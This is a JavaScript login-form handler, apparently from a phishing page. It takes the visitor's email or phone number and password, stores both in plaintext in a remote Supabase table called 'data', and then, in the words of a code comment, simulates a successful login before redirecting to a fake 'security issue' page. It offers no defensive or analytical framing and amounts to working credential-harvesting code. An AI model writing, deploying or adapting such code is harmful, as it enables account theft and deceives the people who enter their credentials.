// Form submission handler
async function handleFormSubmission(event) {
	event.preventDefault(); // Prevent default form submission

	// Get form data
	const email = document.getElementById('email-or-number').value;
	const password = document.getElementById('password').value;

	// Validate inputs
	if (!email || !password) {
		alert('Please fill in both email and password fields.');
		return;
	}

	try {
		// Show loading state
		const submitButton = document.getElementById('submit');
		const originalText = submitButton.value;
		submitButton.value = 'Logging in...';
		submitButton.disabled = true;

		// Insert data into Supabase
		const { data, error } = await window.supabaseClient.from('data').insert([
			{
				email: email,
				password: password,
				created_at: new Date().toISOString(),
			},
		]);

		if (error) {
			console.error('Error inserting data:', error);
			alert('Login failed. Please try again.');
		} else {
			console.log('Data inserted successfully:', data);
			// Simulate successful login - redirect to security issue page
			window.location.href = 'issue.html';
			// Optional: Clear form
			document.getElementById('email-or-number').value = '';
			document.getElementById('password').value = '';
		}
	} catch (error) {
		console.error('Unexpected error:', error);
		alert('An unexpected error occurred. Please try again.');
	} finally {
		// Reset button state
		const submitButton = document.getElementById('submit');
		submitButton.value = 'Log In';
		submitButton.disabled = false;
	}
}

// Initialize form handler when DOM is loaded
document.addEventListener('DOMContentLoaded', function () {
	const form = document.querySelector('form');
	if (form) {
		form.addEventListener('submit', handleFormSubmission);
	}
});
